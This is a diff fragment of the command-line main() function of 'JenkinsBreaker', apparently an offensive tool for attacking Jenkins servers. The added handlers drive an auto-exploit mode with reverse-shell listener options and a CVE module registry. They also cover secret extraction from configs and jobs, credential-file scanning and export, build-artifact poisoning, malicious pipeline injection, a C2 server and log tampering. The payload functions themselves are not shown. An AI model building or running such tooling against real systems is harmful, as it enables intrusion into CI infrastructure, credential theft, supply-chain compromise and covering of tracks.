     exploit_group = parser.add_argument_group("[bold cyan]Exploitation Options[/bold cyan]")
@@ -1716,7 +2540,8 @@ def main():
     decrypt_group.add_argument("--master-key-file", help="Path to master.key file")
     decrypt_group.add_argument("--hudson-secret-file", help="Path to hudson.util.Secret file")
     decrypt_group.add_argument("--save-report", type=str, help="Export findings to a report")
-    decrypt_group.add_argument("--format", choices=["json", "md", "pdf"], default="json", help="Report format")
+    decrypt_group.add_argument("--report", nargs='?', const="all", metavar="FORMAT", help="Generate report (json/md/pdf/all, default: all)")
+    decrypt_group.add_argument("--format", choices=["json", "md", "pdf", "all"], default="json", help="Report format")
     decrypt_group.add_argument("--save-history", type=str, help="Export command history")
     decrypt_group.add_argument("--history-format", choices=["markdown", "bash"], default="markdown", help="History format")
     decrypt_group.add_argument("--generate-test-files", action="store_true", help="Generate test master.key, config.xml, hudson.util.Secret")
@@ -1730,6 +2555,8 @@ def main():
     # Advanced Options
     advanced_group = parser.add_argument_group("[bold cyan]Advanced Options[/bold cyan]")
     advanced_group.add_argument("--multithreaded", action="store_true", help="Enable multithreaded exploit execution")
+    advanced_group.add_argument("--dry-run", action="store_true", help="Perform fingerprinting and show exploits without executing")
+    advanced_group.add_argument("--list-cves", action="store_true", help="List all available CVE exploit modules")
 
     # Subparser for 'run' command
     subparsers = parser.add_subparsers(dest="command")
@@ -1758,6 +2585,41 @@ def main():
 
     if args.tutorial:
         display_tutorial()
+        return
+
+    if args.list_cves:
+        from exploits import ExploitRegistry
+        from rich.table import Table
+        
+        console.print("[bold cyan][*] Available CVE Exploit Modules[/bold cyan]\n")
+        
+        registry = ExploitRegistry()
+        loaded_count = registry.load_all_modules()
+        
+        modules_info = registry.list_modules()
+        
+        if modules_info:
+            table = Table(title="JenkinsBreaker CVE Modules", show_header=True, header_style="bold cyan")
+            table.add_column("CVE ID", style="yellow")
+            table.add_column("Name", style="cyan")
+            table.add_column("Severity", style="red")
+            table.add_column("Affected Versions", style="green")
+            table.add_column("MITRE ATT&CK", style="magenta")
+            
+            for module in sorted(modules_info, key=lambda x: x['cve_id']):
+                table.add_row(
+                    module['cve_id'],
+                    module['name'],
+                    module['severity'],
+                    module['affected_versions'][:50] + "..." if len(module['affected_versions']) > 50 else module['affected_versions'],
+                    module['mitre_attack'][:30] + "..." if len(module['mitre_attack']) > 30 else module['mitre_attack']
+                )
+            
+            console.print(table)
+            console.print(f"\n[green][+] Total: {len(modules_info)} CVE modules loaded[/green]")
+        else:
+            console.print("[red][!] No CVE modules found[/red]")
+        
         return
 
     headers = parse_headers(args.headers)
@@ -1859,14 +2721,20 @@ def main():
             tool.command_history.append({"command": "tamper_logs", "timestamp": datetime.now().isoformat()})
 
         if args.auto:
-            if not (args.lhost and args.lport):
-                console.print("[red][-] --auto requires --lhost and --lport[/red]")
+            if not args.dry_run and not (args.lhost and args.lport):
+                console.print("[red][-] --auto requires --lhost and --lport (unless --dry-run is used)[/red]")
                 console.print("[yellow]Example: python3 jenkinsbreaker.py --url http://jenkins:8080 --auto --lhost 192.168.1.100 --lport 4444[/yellow]")
+                console.print("[yellow]Or dry-run: python3 jenkinsbreaker.py --url http://jenkins:8080 --auto --dry-run[/yellow]")
                 continue
-            console.print(f"[yellow][*] Running auto-exploit mode for {url}...[/yellow]")
-            tool.enumerate_version()
-            auto_own_sandbox_bypass(url, args.lhost, args.lport, auth=auth, http_port=args.http_port, vulnerabilities=tool.vulnerabilities, multithreaded=args.multithreaded, headers=headers, proxies=proxy, delay=delay, use_dns=args.dns_domain is not None, dns_domain=args.dns_domain, use_meterpreter=args.meterpreter)
-            tool.command_history.append({"command": "auto", "timestamp": datetime.now().isoformat()})
+            
+            if args.dry_run:
+                console.print(f"[yellow][*] Running auto-exploit mode in DRY-RUN for {url}...[/yellow]")
+            else:
+                console.print(f"[yellow][*] Running enhanced auto-exploit mode for {url}...[/yellow]")
+            
+            results = tool.auto_exploit_with_fingerprinting(lhost=args.lhost, lport=args.lport, dry_run=args.dry_run)
+            tool.exploits_attempted.extend(results)
+            tool.command_history.append({"command": "auto_exploit_with_fingerprinting", "timestamp": datetime.now().isoformat()})
 
         elif args.get_crumb:
             console.print(f"[green][+] Crumb for {url}: {tool.get_csrf_crumb()}[/green]")
@@ -1950,6 +2818,37 @@ def main():
             tool.manual_reverse_shell_exploit(args.lhost, args.lport)
             tool.command_history.append({"command": "manual_reverse_shell_exploit", "timestamp": datetime.now().isoformat()})
 
+        # Post-Exploitation and Secrets Extraction Handlers
+        if args.extract_secrets:
+            crumb_manager = CrumbManager(url, auth=auth)
+            tool.extract_secrets_from_config(reveal=args.reveal_secrets, crumb_manager=crumb_manager)
+            tool.command_history.append({"command": "extract_secrets_from_config", "timestamp": datetime.now().isoformat()})
+
+        if args.extract_job_secrets:
+            tool.extract_job_secrets(reveal=args.reveal_secrets)
+            tool.command_history.append({"command": "extract_job_secrets", "timestamp": datetime.now().isoformat()})
+
+        if args.scan_credential_files:
+            crumb_manager = CrumbManager(url, auth=auth)
+            tool.scan_credential_files(reveal=args.reveal_secrets, crumb_manager=crumb_manager)
+            tool.command_history.append({"command": "scan_credential_files", "timestamp": datetime.now().isoformat()})
+
+        if args.export_secrets:
+            tool.export_secrets(output_file=args.export_secrets, reveal=args.reveal_secrets)
+            tool.command_history.append({"command": "export_secrets", "timestamp": datetime.now().isoformat()})
+
+        if args.poison_artifact:
+            job_name, artifact_name, payload = args.poison_artifact
+            crumb_manager = CrumbManager(url, auth=auth)
+            tool.poison_artifact(job_name, artifact_name, payload, crumb_manager=crumb_manager)
+            tool.command_history.append({"command": "poison_artifact", "timestamp": datetime.now().isoformat()})
+
+        if args.inject_pipeline:
+            job_name, malicious_pipeline = args.inject_pipeline
+            crumb_manager = CrumbManager(url, auth=auth)
+            tool.inject_pipeline(job_name, malicious_pipeline, crumb_manager=crumb_manager)
+            tool.command_history.append({"command": "inject_pipeline", "timestamp": datetime.now().isoformat()})
+
         # Handle server actions for the last target
         if args.start_c2:
     	     tool.start_c2_server(host=args.c2_host, port=args.c2_port)
@@ -1963,6 +2862,16 @@ def main():
         elif not any(vars(args).values()) and url:
             console.print(f"[yellow][*] No specific action provided for {url}. Running version enumeration...[/yellow]")
             tool.enumerate_version()
+        
+        if args.save_report:
+            tool.export_report(filename=args.save_report, format=args.format)
+        
+        if args.report:
+            report_format = args.report if args.report in ['json', 'md', 'pdf', 'all'] else 'all'
+            tool.export_report(format=report_format)
+        
+        if args.save_history:
+            tool.save_history(filename=args.save_history, format=args.history_format)
 
     # Handle case with no targets and no general actions
     if not targets and not (args.generate_shell or args.generate_metasploit or args.generate_test_files or args.help_commands or args.help_command or args.tutorial):
